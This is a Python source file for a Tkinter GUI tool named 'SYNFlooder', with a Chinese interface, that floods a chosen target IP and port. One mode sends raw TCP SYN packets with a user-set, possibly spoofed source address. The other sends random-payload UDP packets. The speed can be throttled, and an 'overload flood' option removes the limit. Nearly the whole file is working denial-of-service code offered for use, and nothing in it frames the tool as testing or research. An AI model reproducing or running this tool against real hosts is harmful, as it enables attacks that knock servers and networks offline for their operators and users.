import tkinter as tk
from tkinter import messagebox
import time
import socket
import threading
import random
import impacket.ImpactPacket
import warnings
import webbrowser

warnings.filterwarnings("ignore")

attack_running = False  # 用于控制攻击状态的全局变量

def disable_widgets():
    target_ip_entry.config(state='disabled')
    local_ip_entry.config(state='disabled')
    port_entry.config(state='disabled')
    source_port_entry.config(state='disabled')
    speed_entry.config(state='disabled')
    speed_radio_1.config(state='disabled')
    speed_radio_2.config(state='disabled')
    syn_button.config(state='disabled')
    udp_button.config(state='disabled')

def enable_widgets():
    target_ip_entry.config(state='normal')
    local_ip_entry.config(state='normal')
    port_entry.config(state='normal')
    source_port_entry.config(state='normal')
    speed_entry.config(state='normal')
    speed_radio_1.config(state='normal')
    speed_radio_2.config(state='normal')
    syn_button.config(state='normal')
    udp_button.config(state='normal')

def log_message(message):
    output_text.config(state='normal')
    output_text.insert(tk.END, message + '\n')
    output_text.see(tk.END)
    output_text.config(state='disabled')

def start_syn_attack():
    global attack_running
    dip = target_ip_entry.get()
    lip = local_ip_entry.get()
    port = int(port_entry.get())
    sport = int(source_port_entry.get())
    speed = int(speed_entry.get()) if speed_var.get() == 1 else None

    if not dip or not lip:
        messagebox.showwarning("输入警告", "目标 IP 和数据包源 IP 均为必填项")
        return

    attack_running = True
    disable_widgets()
    log_message("开始 SYN 攻击...")
    threading.Thread(target=syn_attack, args=(dip, lip, port, sport, speed)).start()

def start_udp_attack():
    global attack_running
    dip = target_ip_entry.get()
    port = int(port_entry.get())
    speed = int(speed_entry.get()) if speed_var.get() == 1 else None

    if not dip:
        messagebox.showwarning("输入警告", "目标 IP 为必填项")
        return

    attack_running = True
    disable_widgets()
    log_message("开始 UDP 攻击...")
    threading.Thread(target=udp_attack, args=(dip, port, speed)).start()

def stop_attack():
    global attack_running
    attack_running = False
    enable_widgets()

def syn_attack(dip, lip, port, sport, speed):
    sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        messagebox.showerror("权限警告", "需要管理员/sudo权限运行此脚本")
        return

    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()

    ip.set_ip_src(lip)
    ip.set_ip_dst(dip)
    ip.set_ip_ttl(255)

    tcp.set_th_flags(0b00000010)
    tcp.set_th_sport(sport)
    tcp.set_th_dport(port)
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)

    while attack_running:
        ip.contains(tcp)
        ip.calculate_checksum()
        try:
            sock.sendto(ip.get_packet(), (dip, port))
            sent += 1
            log_message(f"已发送 {sent} 个SYN数据包到 {dip} 端口 {port}")
            if speed is not None:
                time.sleep((1000 - speed) / 2000)
        except Exception as e:
            log_message(f"发送数据包时出错: {e}")
            break
    log_message(f"攻击已结束，共发送 {sent} 个数据包")
    enable_widgets()

def udp_attack(dip, port, speed):
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    while attack_running:
        sock.sendto(bytes, (dip, port))
        sent += 1
        log_message(f"已发送 {sent} 个UDP数据包到 {dip} 端口 {port}")
        if speed is not None:
            time.sleep((1000 - speed) / 2000)
    log_message(f"攻击已结束，共发送 {sent} 个数据包")
    enable_widgets()

def toggle_speed_entry():
    if speed_var.get() == 1:
        speed_entry.config(state='normal')
    else:
        speed_entry.config(state='disabled')

def color_change(widget, colors, delay):
    current_color = widget.cget("fg")
    next_color = colors[(colors.index(current_color) + 1) % len(colors)]
    widget.config(fg=next_color)
    widget.after(delay, color_change, widget, colors, delay)

def flash_red_white(widget, delay):
    current_color = widget.cget("fg")
    next_color = "white" if current_color == "red" else "red"
    widget.config(fg=next_color)
    widget.after(delay, flash_red_white, widget, delay)

root = tk.Tk()
root.title("SYNFlooder")
root.configure(bg='black')

label_font = ("宋体", 9)
button_font = ("宋体", 9)
entry_width = 20
label_fg = "white"
label_bg = "black"
entry_fg = "white"
entry_bg = "black"
entry_font = ("宋体", 9)

tk.Label(root, text="目标服务器 IP:", font=label_font, fg=label_fg, bg=label_bg).grid(row=0, column=0, sticky="e", padx=2, pady=2)
target_ip_entry = tk.Entry(root, width=entry_width, fg=entry_fg, bg=entry_bg, font=entry_font)
target_ip_entry.grid(row=0, column=1, sticky="w", padx=2, pady=2)

tk.Label(root, text="数据包源 IP:", font=label_font, fg=label_fg, bg=label_bg).grid(row=1, column=0, sticky="e", padx=2, pady=2)
local_ip_entry = tk.Entry(root, width=entry_width, fg=entry_fg, bg=entry_bg, font=entry_font)
local_ip_entry.grid(row=1, column=1, sticky="w", padx=2, pady=2)

tk.Label(root, text="目标端口:", font=label_font, fg=label_fg, bg=label_bg).grid(row=2, column=0, sticky="e", padx=2, pady=2)
port_entry = tk.Entry(root, width=entry_width, fg=entry_fg, bg=entry_bg, font=entry_font)
port_entry.grid(row=2, column=1, sticky="w", padx=2, pady=2)
port_entry.insert(0, "80")

tk.Label(root, text="源端口:", font=label_font, fg=label_fg, bg=label_bg).grid(row=3, column=0, sticky="e", padx=2, pady=2)
source_port_entry = tk.Entry(root, width=entry_width, fg=entry_fg, bg=entry_bg, font=entry_font)
source_port_entry.grid(row=3, column=1, sticky="w", padx=2, pady=2)
source_port_entry.insert(0, "12228")

tk.Label(root, text="发送速度:", font=label_font, fg=label_fg, bg=label_bg).grid(row=4, column=0, sticky="e", padx=2, pady=2)

speed_var = tk.IntVar(value=1)
speed_radio_1 = tk.Radiobutton(root, text="自设定速度", variable=speed_var, value=1, command=toggle_speed_entry, font=label_font, fg=label_fg, bg=label_bg, selectcolor='black')
speed_radio_1.grid(row=4, column=1, sticky="w", padx=2, pady=2)
speed_entry = tk.Entry(root, width=10, fg=entry_fg, bg=entry_bg, font=entry_font)
speed_entry.grid(row=4, column=2, sticky="w", padx=2, pady=2)
speed_entry.insert(0, "1000")

speed_radio_2 = tk.Radiobutton(root, text="超负荷泛洪（慎用！）", variable=speed_var, value=2, command=toggle_speed_entry, font=label_font, fg='red', bg=label_bg, selectcolor='black')
speed_radio_2.grid(row=5, column=1, sticky="w", padx=2, pady=2)

syn_button = tk.Button(root, text="开始 SYN 攻击", command=start_syn_attack, font=button_font, fg='red', bg=label_bg, width=15)
udp_button = tk.Button(root, text="开始 UDP 攻击", command=start_udp_attack, font=button_font, fg='red', bg=label_bg, width=15)
stop_button = tk.Button(root, text="停止攻击", command=stop_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)

syn_button.grid(row=6, column=0, pady=2, padx=2)
udp_button.grid(row=6, column=1, pady=2, padx=2)
stop_button.grid(row=6, column=2, pady=2, padx=2)

color_change(syn_button, ["red", "orange", "yellow", "green", "blue", "purple"], 100)
color_change(udp_button, ["red", "orange", "yellow", "green", "blue", "purple"], 100)
flash_red_white(speed_radio_2, 500)

# 添加输出文本框
output_text = tk.Text(root, width=45, height=8, fg=entry_fg, bg=entry_bg, state='disabled', font=entry_font)
output_text.grid(row=7, column=0, columnspan=3, padx=2, pady=2)
log_message("等待任务中……")

def open_project_link(event):
    webbrowser.open_new("http://github.com/Gr3yPh/SYNFlooder")

project_link = tk.Label(root, text="http://github.com/Gr3yPh/SYNFlooder", font=label_font, fg=label_fg, bg=label_bg, cursor="hand2")
project_link.grid(row=8, column=0, columnspan=3, pady=2)
project_link.bind("<Button-1>", open_project_link)

author_name = tk.Label(root, text="作者：GR3YPH_4NTOM | 版本：v1.1", font=label_font, fg=label_fg, bg=label_bg)
author_name.grid(row=9, column=0, columnspan=3, pady=2)

root.mainloop()
